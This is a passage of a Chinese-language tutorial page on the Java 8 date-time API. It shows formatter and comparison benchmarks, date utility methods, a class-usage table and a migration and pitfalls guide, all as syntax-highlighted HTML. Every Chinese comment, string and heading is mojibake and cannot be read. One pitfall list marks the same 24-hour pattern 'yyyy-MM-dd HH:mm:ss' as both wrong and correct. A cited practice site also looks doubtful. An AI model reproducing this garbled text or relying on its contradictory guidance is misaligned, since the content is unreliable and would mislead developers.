            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) {
                <span class="hljs-keyword">if</span> (timestamps[i] &gt;= startMillis &amp;&amp; timestamps[i] &lt;= endMillis) {
                    result.add(i);
                }
            }
            <span class="hljs-keyword">return</span> result;
        }
    }
    
    <span class="hljs-comment">// 6. åŸºå‡†æµ‹è¯•ï¼šå¯¹æ¯”ä¸åŒå®ç°æ–¹å¼çš„æ€§èƒ½</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeBenchmark</span> {
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">benchmarkFormatting</span><span class="hljs-params">()</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">iterations</span> <span class="hljs-operator">=</span> <span class="hljs-number">100000</span>;
            <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> LocalDateTime.now();
            
            <span class="hljs-comment">// æµ‹è¯•1ï¼šé‡å¤åˆ›å»ºæ ¼å¼åŒ–å™¨</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">start1</span> <span class="hljs-operator">=</span> System.nanoTime();
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
                <span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> now.format(formatter);
            }
            <span class="hljs-type">long</span> <span class="hljs-variable">time1</span> <span class="hljs-operator">=</span> System.nanoTime() - start1;
            
            <span class="hljs-comment">// æµ‹è¯•2ï¼šé‡ç”¨æ ¼å¼åŒ–å™¨</span>
            <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
            <span class="hljs-type">long</span> <span class="hljs-variable">start2</span> <span class="hljs-operator">=</span> System.nanoTime();
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iterations; i++) {
                <span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> now.format(formatter);
            }
            <span class="hljs-type">long</span> <span class="hljs-variable">time2</span> <span class="hljs-operator">=</span> System.nanoTime() - start2;
            
            System.out.println(<span class="hljs-string">"=== æ ¼å¼åŒ–æ€§èƒ½æµ‹è¯• ==="</span>);
            System.out.printf(<span class="hljs-string">"é‡å¤åˆ›å»ºæ ¼å¼åŒ–å™¨: %,d ns%n"</span>, time1);
            System.out.printf(<span class="hljs-string">"é‡ç”¨æ ¼å¼åŒ–å™¨: %,d ns%n"</span>, time2);
            System.out.printf(<span class="hljs-string">"æ€§èƒ½æå‡: %.1f%%%n"</span>, (time1 - time2) * <span class="hljs-number">100.0</span> / time1);
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">benchmarkComparison</span><span class="hljs-params">()</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">iterations</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000000</span>;
            List&lt;LocalDate&gt; dates = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();
            
            <span class="hljs-comment">// ç”Ÿæˆæµ‹è¯•æ•°æ®</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
                dates.add(LocalDate.now().plusDays(random.nextInt(<span class="hljs-number">365</span>)));
            }
            
            <span class="hljs-type">LocalDate</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> LocalDate.now().minusDays(<span class="hljs-number">180</span>);
            <span class="hljs-type">LocalDate</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> LocalDate.now().plusDays(<span class="hljs-number">180</span>);
            
            <span class="hljs-comment">// æµ‹è¯•ä¸åŒçš„æ¯”è¾ƒæ–¹æ³•</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.nanoTime();
            <span class="hljs-type">long</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> dates.stream()
                .filter(date -&gt; date.isAfter(start) &amp;&amp; date.isBefore(end))
                .count();
            <span class="hljs-type">long</span> <span class="hljs-variable">time1</span> <span class="hljs-operator">=</span> System.nanoTime() - startTime;
            
            startTime = System.nanoTime();
            <span class="hljs-type">long</span> <span class="hljs-variable">startEpochDay</span> <span class="hljs-operator">=</span> start.toEpochDay();
            <span class="hljs-type">long</span> <span class="hljs-variable">endEpochDay</span> <span class="hljs-operator">=</span> end.toEpochDay();
            <span class="hljs-type">long</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> dates.stream()
                .filter(date -&gt; {
                    <span class="hljs-type">long</span> <span class="hljs-variable">epochDay</span> <span class="hljs-operator">=</span> date.toEpochDay();
                    <span class="hljs-keyword">return</span> epochDay &gt; startEpochDay &amp;&amp; epochDay &lt; endEpochDay;
                })
                .count();
            <span class="hljs-type">long</span> <span class="hljs-variable">time2</span> <span class="hljs-operator">=</span> System.nanoTime() - startTime;
            
            System.out.println(<span class="hljs-string">"\n=== æ—¥æœŸæ¯”è¾ƒæ€§èƒ½æµ‹è¯• ==="</span>);
            System.out.printf(<span class="hljs-string">"ä½¿ç”¨isAfter/isBefore: %,d ns%n"</span>, time1);
            System.out.printf(<span class="hljs-string">"ä½¿ç”¨epochDayç›´æ¥æ¯”è¾ƒ: %,d ns%n"</span>, time2);
            System.out.printf(<span class="hljs-string">"æ€§èƒ½æå‡: %.1f%%%n"</span>, (time1 - time2) * <span class="hljs-number">100.0</span> / time1);
        }
    }
    
    <span class="hljs-comment">// 7. å®ç”¨çš„å·¥å…·æ–¹æ³•</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeUtils</span> {
        
        <span class="hljs-comment">// å®‰å…¨è§£ææ—¥æœŸï¼Œæ”¯æŒå¤šç§æ ¼å¼</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Optional&lt;LocalDate&gt; <span class="hljs-title function_">safeParseDate</span><span class="hljs-params">(String dateStr)</span> {
            String[] patterns = {
                <span class="hljs-string">"yyyy-MM-dd"</span>,
                <span class="hljs-string">"yyyy/MM/dd"</span>,
                <span class="hljs-string">"dd/MM/yyyy"</span>,
                <span class="hljs-string">"dd-MM-yyyy"</span>,
                <span class="hljs-string">"yyyy.MM.dd"</span>,
                <span class="hljs-string">"MM/dd/yyyy"</span>
            };
            
            <span class="hljs-keyword">for</span> (String pattern : patterns) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(pattern);
                    <span class="hljs-keyword">return</span> Optional.of(LocalDate.parse(dateStr, formatter));
                } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
                    <span class="hljs-keyword">continue</span>;
                }
            }
            
            <span class="hljs-keyword">return</span> Optional.empty();
        }
        
        <span class="hljs-comment">// è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„å·¥ä½œæ—¥</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">calculateWorkingDays</span><span class="hljs-params">(LocalDate start, LocalDate end)</span> {
            <span class="hljs-keyword">return</span> start.datesUntil(end.plusDays(<span class="hljs-number">1</span>))
                .filter(date -&gt; date.getDayOfWeek() != DayOfWeek.SATURDAY &amp;&amp;
                              date.getDayOfWeek() != DayOfWeek.SUNDAY)
                .count();
        }
        
        <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªå·¥ä½œæ—¥</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LocalDate <span class="hljs-title function_">getNextWorkingDay</span><span class="hljs-params">(LocalDate date)</span> {
            <span class="hljs-type">LocalDate</span> <span class="hljs-variable">nextDay</span> <span class="hljs-operator">=</span> date.plusDays(<span class="hljs-number">1</span>);
            <span class="hljs-keyword">while</span> (nextDay.getDayOfWeek() == DayOfWeek.SATURDAY || 
                   nextDay.getDayOfWeek() == DayOfWeek.SUNDAY) {
                nextDay = nextDay.plusDays(<span class="hljs-number">1</span>);
            }
            <span class="hljs-keyword">return</span> nextDay;
        }
        
        <span class="hljs-comment">// æ ¼å¼åŒ–æ—¶é—´å·®ä¸ºå¯è¯»å­—ç¬¦ä¸²</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">formatDurationReadable</span><span class="hljs-params">(Duration duration)</span> {
            <span class="hljs-keyword">if</span> (duration.isNegative()) {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"å·²è¿‡æœŸ"</span>;
            }
            
            <span class="hljs-keyword">if</span> (duration.toDays() &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%då¤©%då°æ—¶"</span>, duration.toDays(), duration.toHoursPart());
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toHours() &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%då°æ—¶%dåˆ†é’Ÿ"</span>, duration.toHours(), duration.toMinutesPart());
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toMinutes() &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%dåˆ†é’Ÿ"</span>, duration.toMinutes());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%dç§’"</span>, duration.toSeconds());
            }
        }
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯è¥ä¸šæ—¶é—´ï¼ˆè€ƒè™‘å‘¨æœ«å’ŒèŠ‚å‡æ—¥ï¼‰</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBusinessTime</span><span class="hljs-params">(LocalDateTime dateTime, 
                                            Set&lt;LocalDate&gt; holidays)</span> {
            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯å‘¨æœ«</span>
            <span class="hljs-type">DayOfWeek</span> <span class="hljs-variable">dayOfWeek</span> <span class="hljs-operator">=</span> dateTime.getDayOfWeek();
            <span class="hljs-keyword">if</span> (dayOfWeek == DayOfWeek.SATURDAY || dayOfWeek == DayOfWeek.SUNDAY) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
            
            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯èŠ‚å‡æ—¥</span>
            <span class="hljs-keyword">if</span> (holidays.contains(dateTime.toLocalDate())) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
            
            <span class="hljs-comment">// æ£€æŸ¥æ—¶é—´æ˜¯å¦åœ¨è¥ä¸šæ—¶é—´å†…ï¼ˆå‡è®¾9:00-18:00ï¼‰</span>
            <span class="hljs-type">LocalTime</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> dateTime.toLocalTime();
            <span class="hljs-keyword">return</span> !time.isBefore(LocalTime.of(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>)) &amp;&amp; 
                   !time.isAfter(LocalTime.of(<span class="hljs-number">18</span>, <span class="hljs-number">0</span>));
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== æ—¥æœŸæ—¶é—´APIæœ€ä½³å®è·µ ==="</span>);
        
        <span class="hljs-comment">// è¿è¡Œæ€§èƒ½æµ‹è¯•</span>
        DateTimeBenchmark.benchmarkFormatting();
        DateTimeBenchmark.benchmarkComparison();
        
        <span class="hljs-comment">// æ¼”ç¤ºå®ç”¨å·¥å…·æ–¹æ³•</span>
        System.out.println(<span class="hljs-string">"\n=== å®ç”¨å·¥å…·æ–¹æ³•æ¼”ç¤º ==="</span>);
        
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> LocalDate.now();
        System.out.println(<span class="hljs-string">"ä»Šå¤©: "</span> + today);
        System.out.println(<span class="hljs-string">"ä¸‹ä¸€ä¸ªå·¥ä½œæ—¥: "</span> + DateTimeUtils.getNextWorkingDay(today));
        
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> today.minusDays(<span class="hljs-number">30</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> today.plusDays(<span class="hljs-number">30</span>);
        System.out.printf(<span class="hljs-string">"%s åˆ° %s ä¹‹é—´çš„å·¥ä½œæ—¥: %då¤©%n"</span>, 
            start, end, DateTimeUtils.calculateWorkingDays(start, end));
        
        <span class="hljs-comment">// æµ‹è¯•å®‰å…¨è§£æ</span>
        String[] testDates = {<span class="hljs-string">"2023-11-15"</span>, <span class="hljs-string">"15/11/2023"</span>, <span class="hljs-string">"2023.11.15"</span>, <span class="hljs-string">"æ— æ•ˆæ—¥æœŸ"</span>};
        <span class="hljs-keyword">for</span> (String testDate : testDates) {
            Optional&lt;LocalDate&gt; parsed = DateTimeUtils.safeParseDate(testDate);
            System.out.printf(<span class="hljs-string">"è§£æ '%s': %s%n"</span>, 
                testDate, 
                parsed.map(LocalDate::toString).orElse(<span class="hljs-string">"è§£æå¤±è´¥"</span>));
        }
        
        <span class="hljs-comment">// æ¼”ç¤ºç¼“å­˜ç³»ç»Ÿ</span>
        System.out.println(<span class="hljs-string">"\n=== çº¿ç¨‹å®‰å…¨æ ¼å¼åŒ–æ¼”ç¤º ==="</span>);
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);
        List&lt;Future&lt;String&gt;&gt; futures = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> i;
            futures.add(executor.submit(() -&gt; 
                ThreadSafeFormatter.format(LocalDateTime.now(), <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>) + 
                <span class="hljs-string">" - çº¿ç¨‹"</span> + index
            ));
        }
        
        <span class="hljs-keyword">for</span> (Future&lt;String&gt; future : futures) {
            <span class="hljs-keyword">try</span> {
                System.out.println(future.get());
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
            }
        }
        
        executor.shutdown();
    }
}
</code></pre>
<h2 data-id="heading-19">æ€»ç»“ï¼šJava 8æ—¥æœŸæ—¶é—´APIçš„æ ¸å¿ƒè¦ç‚¹</h2>
<h3 data-id="heading-20">ä¸»è¦ä¼˜åŠ¿</h3>
<ol>
<li><strong>ä¸å¯å˜æ€§</strong>ï¼šæ‰€æœ‰æ ¸å¿ƒç±»éƒ½æ˜¯ä¸å¯å˜çš„ï¼Œçº¿ç¨‹å®‰å…¨</li>
<li><strong>æ¸…æ™°çš„APIè®¾è®¡</strong>ï¼šåˆ†ç¦»äº†æ—¥æœŸã€æ—¶é—´ã€æ—¶åŒºç­‰æ¦‚å¿µ</li>
<li><strong>å¼ºå¤§çš„æ—¶åŒºæ”¯æŒ</strong>ï¼šå†…ç½®å®Œå–„çš„æ—¶åŒºå¤„ç†æœºåˆ¶</li>
<li><strong>æµç•…çš„é“¾å¼è°ƒç”¨</strong>ï¼šä»£ç æ›´æ˜“è¯»ã€æ›´æ˜“å†™</li>
<li><strong>ISOæ ‡å‡†å…¼å®¹</strong>ï¼šé»˜è®¤ä½¿ç”¨ISO-8601æ ‡å‡†</li>
</ol>
<h3 data-id="heading-21">å¸¸è§ä½¿ç”¨åœºæ™¯</h3>













































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èä½¿ç”¨çš„ç±»</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>åªå¤„ç†æ—¥æœŸ</td><td>LocalDate</td><td>ç”Ÿæ—¥ã€çºªå¿µæ—¥ã€æˆªæ­¢æ—¥æœŸ</td></tr><tr><td>åªå¤„ç†æ—¶é—´</td><td>LocalTime</td><td>è¥ä¸šæ—¶é—´ã€ä¼šè®®æ—¶é—´</td></tr><tr><td>æ—¥æœŸ+æ—¶é—´</td><td>LocalDateTime</td><td>æ—¥å¿—æ—¶é—´ã€åˆ›å»ºæ—¶é—´</td></tr><tr><td>è·¨æ—¶åŒºåº”ç”¨</td><td>ZonedDateTime</td><td>å›½é™…ä¼šè®®ã€èˆªç­æ—¶é—´</td></tr><tr><td>æ—¶é—´ç‚¹/æ—¶é—´æˆ³</td><td>Instant</td><td>æ€§èƒ½æµ‹é‡ã€ç¼“å­˜è¿‡æœŸ</td></tr><tr><td>æ—¶é—´æ®µï¼ˆæ—¶é—´ï¼‰</td><td>Duration</td><td>ç”µå½±æ—¶é•¿ã€ä»»åŠ¡è€—æ—¶</td></tr><tr><td>æ—¶é—´æ®µï¼ˆæ—¥æœŸï¼‰</td><td>Period</td><td>å¹´é¾„ã€è®¢é˜…æœŸé™</td></tr></tbody></table>
<h3 data-id="heading-22">è¿ç§»æŒ‡å—ï¼ˆä»ä¼ ç»ŸAPIè¿ç§»ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MigrationGuide</span> {
    
    <span class="hljs-comment">// ä¼ ç»ŸAPI -&gt; Java 8 APIçš„è¿ç§»</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">migrateFromLegacy</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"=== ä»ä¼ ç»ŸAPIè¿ç§»åˆ°Java 8 API ==="</span>);
        
        <span class="hljs-comment">// 1. Date -&gt; Instant/LocalDateTime</span>
        java.util.<span class="hljs-type">Date</span> <span class="hljs-variable">oldDate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Date();
        <span class="hljs-type">Instant</span> <span class="hljs-variable">instant</span> <span class="hljs-operator">=</span> oldDate.toInstant();
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">localDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
        System.out.println(<span class="hljs-string">"Date -&gt; LocalDateTime: "</span> + localDateTime);
        
        <span class="hljs-comment">// 2. Calendar -&gt; ZonedDateTime</span>
        <span class="hljs-type">Calendar</span> <span class="hljs-variable">calendar</span> <span class="hljs-operator">=</span> Calendar.getInstance();
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zonedDateTime</span> <span class="hljs-operator">=</span> ZonedDateTime.ofInstant(
            calendar.toInstant(),
            calendar.getTimeZone().toZoneId()
        );
        System.out.println(<span class="hljs-string">"Calendar -&gt; ZonedDateTime: "</span> + zonedDateTime);
        
        <span class="hljs-comment">// 3. SimpleDateFormat -&gt; DateTimeFormatter</span>
        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd"</span>);
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd"</span>);
        System.out.println(<span class="hljs-string">"æ ¼å¼åŒ–: "</span> + formatter.format(LocalDate.now()));
        
        <span class="hljs-comment">// 4. æ—¶é—´è¿ç®—çš„è¿ç§»</span>
        calendar.add(Calendar.DAY_OF_MONTH, <span class="hljs-number">7</span>);
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">sevenDaysLater</span> <span class="hljs-operator">=</span> zonedDateTime.plusDays(<span class="hljs-number">7</span>);
        System.out.println(<span class="hljs-string">"7å¤©å: "</span> + sevenDaysLater);
        
        <span class="hljs-comment">// 5. æ—¶é—´æ¯”è¾ƒçš„è¿ç§»</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isBefore</span> <span class="hljs-operator">=</span> calendar.before(Calendar.getInstance());
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isBefore8</span> <span class="hljs-operator">=</span> zonedDateTime.isBefore(ZonedDateTime.now());
        System.out.println(<span class="hljs-string">"æ—¶é—´æ¯”è¾ƒ: "</span> + isBefore8);
    }
    
    <span class="hljs-comment">// å¸¸è§é™·é˜±å’Œè§£å†³æ–¹æ¡ˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commonPitfalls</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== å¸¸è§é™·é˜±å’Œè§£å†³æ–¹æ¡ˆ ==="</span>);
        
        <span class="hljs-comment">// é™·é˜±1ï¼šæ—¶åŒºå¤„ç†ä¸å½“</span>
        System.out.println(<span class="hljs-string">"\né™·é˜±1ï¼šæ—¶åŒºå¤„ç†"</span>);
        System.out.println(<span class="hljs-string">"âŒ LocalDateTime.now() ä¸åŒ…å«æ—¶åŒºä¿¡æ¯"</span>);
        System.out.println(<span class="hljs-string">"âœ… ä½¿ç”¨ ZonedDateTime.now() æˆ–æŒ‡å®šæ—¶åŒº"</span>);
        
        <span class="hljs-comment">// é™·é˜±2ï¼šå¿½ç•¥ä¸å¯å˜æ€§</span>
        System.out.println(<span class="hljs-string">"\né™·é˜±2ï¼šå¿½ç•¥ä¸å¯å˜æ€§"</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> LocalDate.of(<span class="hljs-number">2023</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>);
        date.plusDays(<span class="hljs-number">1</span>); <span class="hljs-comment">// è¿™ä¸ªæ–¹æ³•è¿”å›æ–°å¯¹è±¡ï¼Œä¸ä¿®æ”¹åŸå¯¹è±¡</span>
        System.out.println(<span class="hljs-string">"date.plusDays(1) åï¼ŒåŸdateæœªæ”¹å˜: "</span> + date);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">newDate</span> <span class="hljs-operator">=</span> date.plusDays(<span class="hljs-number">1</span>);
        System.out.println(<span class="hljs-string">"éœ€è¦æ¥æ”¶è¿”å›å€¼: "</span> + newDate);
        
        <span class="hljs-comment">// é™·é˜±3ï¼šæ ¼å¼åŒ–æ¨¡å¼é”™è¯¯</span>
        System.out.println(<span class="hljs-string">"\né™·é˜±3ï¼šæ ¼å¼åŒ–æ¨¡å¼"</span>);
        System.out.println(<span class="hljs-string">"âŒ yyyy-MM-dd HH:mm:ss - 24å°æ—¶åˆ¶"</span>);
        System.out.println(<span class="hljs-string">"âŒ yyyy-MM-dd hh:mm:ss - 12å°æ—¶åˆ¶ï¼ˆéœ€è¦aè¡¨ç¤ºä¸Šåˆ/ä¸‹åˆï¼‰"</span>);
        System.out.println(<span class="hljs-string">"âœ… yyyy-MM-dd HH:mm:ss - 24å°æ—¶åˆ¶"</span>);
        System.out.println(<span class="hljs-string">"âœ… yyyy-MM-dd hh:mm:ss a - 12å°æ—¶åˆ¶"</span>);
        
        <span class="hljs-comment">// é™·é˜±4ï¼šè§£æä¸¥æ ¼æ€§</span>
        System.out.println(<span class="hljs-string">"\né™·é˜±4ï¼šè§£æä¸¥æ ¼æ€§"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">dateStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">"2023-02-31"</span>; <span class="hljs-comment">// 2æœˆ31æ—¥ä¸å­˜åœ¨</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">LocalDate</span> <span class="hljs-variable">date2</span> <span class="hljs-operator">=</span> LocalDate.parse(dateStr);
            System.out.println(<span class="hljs-string">"å®½æ¾è§£æ: "</span> + date2);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.out.println(<span class="hljs-string">"é»˜è®¤ä¸¥æ ¼è§£æå¤±è´¥: "</span> + e.getMessage());
        }
    }
    
    <span class="hljs-comment">// æ€§èƒ½æœ€ä½³å®è·µæ€»ç»“</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performanceBestPractices</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== æ€§èƒ½æœ€ä½³å®è·µ ==="</span>);
        
        System.out.println(<span class="hljs-string">"1. é‡ç”¨DateTimeFormatter"</span>);
        System.out.println(<span class="hljs-string">"   âœ… å°†æ ¼å¼åŒ–å™¨å£°æ˜ä¸ºé™æ€å¸¸é‡"</span>);
        System.out.println(<span class="hljs-string">"   âŒ é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºæ–°çš„æ ¼å¼åŒ–å™¨"</span>);
        
        System.out.println(<span class="hljs-string">"\n2. ä½¿ç”¨æ­£ç¡®çš„æ•°æ®ç»“æ„"</span>);
        System.out.println(<span class="hljs-string">"   âœ… å¯¹äºæ—¶é—´åºåˆ—æ•°æ®ï¼Œè€ƒè™‘ä½¿ç”¨longæ•°ç»„å­˜å‚¨æ—¶é—´æˆ³"</span>);
        System.out.println(<span class="hljs-string">"   âŒ é¿å…å­˜å‚¨å¤§é‡LocalDateTimeå¯¹è±¡"</span>);
        
        System.out.println(<span class="hljs-string">"\n3. é«˜æ•ˆçš„æ—¶é—´æ¯”è¾ƒ"</span>);
        System.out.println(<span class="hljs-string">"   âœ… å¯¹äºæ‰¹é‡æ¯”è¾ƒï¼Œè½¬æ¢ä¸ºepochDayæˆ–æ—¶é—´æˆ³è¿›è¡Œæ¯”è¾ƒ"</span>);
        System.out.println(<span class="hljs-string">"   âŒ é¿å…åœ¨å¾ªç¯ä¸­å¤šæ¬¡è°ƒç”¨isBefore/isAfter"</span>);
        
        System.out.println(<span class="hljs-string">"\n4. æ—¶åŒºå¤„ç†ä¼˜åŒ–"</span>);
        System.out.println(<span class="hljs-string">"   âœ… å¦‚æœä¸éœ€è¦æ—¶åŒºä¿¡æ¯ï¼Œä½¿ç”¨LocalDateTimeè€Œä¸æ˜¯ZonedDateTime"</span>);
        System.out.println(<span class="hljs-string">"   âœ… é¿å…ä¸å¿…è¦çš„æ—¶åŒºè½¬æ¢"</span>);
        System.out.println(<span class="hljs-string">"   âŒ ä¸è¦åœ¨æ€§èƒ½å…³é”®è·¯å¾„ä¸­é¢‘ç¹è½¬æ¢æ—¶åŒº"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        migrateFromLegacy();
        commonPitfalls();
        performanceBestPractices();
        
        System.out.println(<span class="hljs-string">"\n=== å­¦ä¹ èµ„æºæ¨è ==="</span>);
        System.out.println(<span class="hljs-string">"1. Oracleå®˜æ–¹æ•™ç¨‹: Java Date Time"</span>);
        System.out.println(<span class="hljs-string">"2. ä¹¦ç±: ã€ŠJava 8 in Actionã€‹"</span>);
        System.out.println(<span class="hljs-string">"3. åœ¨çº¿ç»ƒä¹ : codingbat.com/java/Date-Time"</span>);
        System.out.println(<span class="hljs-string">"4. å¼€æºé¡¹ç›®: Joda-Time (Java 8æ—¥æœŸæ—¶é—´APIçš„å‰èº«)"</span>);
        
        System.out.println(<span class="hljs-string">"\nè®°ä½ï¼šç†Ÿç»ƒæŒæ¡Java 8æ—¥æœŸæ—¶é—´APIæ˜¯ç°ä»£Javaå¼€å‘çš„å¿…å¤‡æŠ€èƒ½ï¼"</span>);
    }
}
